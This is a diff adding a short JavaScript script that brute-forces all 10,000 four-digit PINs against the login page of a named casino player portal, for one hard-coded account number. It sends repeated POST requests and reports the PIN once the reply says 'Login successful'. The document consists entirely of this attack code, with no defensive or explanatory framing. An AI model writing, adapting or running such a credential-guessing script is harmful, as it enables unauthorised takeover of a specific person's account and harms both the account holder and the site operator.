@@ -1,0 +1,33 @@
+(async () => {
+    const baseUrl = 'https://playerportal.jresortreno.com/'; //
+ const accountNumber = '12808399'; //
+    const start = 0;
+    const end = 9999;
+    const delay = 50; // Delay in milliseconds between attempts
+
+    async function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    for (let pin = start; pin <= end; pin++) {
+        const pinStr = pin.toString().padStart(4, '0');
+        try {
+            const response = await fetch(`${baseUrl}/login`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `accountNumber=${encodeURIComponent(12808399)}&pin=${encodeURIComponent(pinStr)}`
+            });
+
+            const responseData = await response.text();
+            if (responseData.includes('Login successful')) { // l
+                console.log(`PIN found: ${pinStr}`);
+                break;
+            }
+        } catch (error) {
+            console.error(`An error occurred: ${error}`);
+        }
+        await sleep(delay);
+    }
+})();
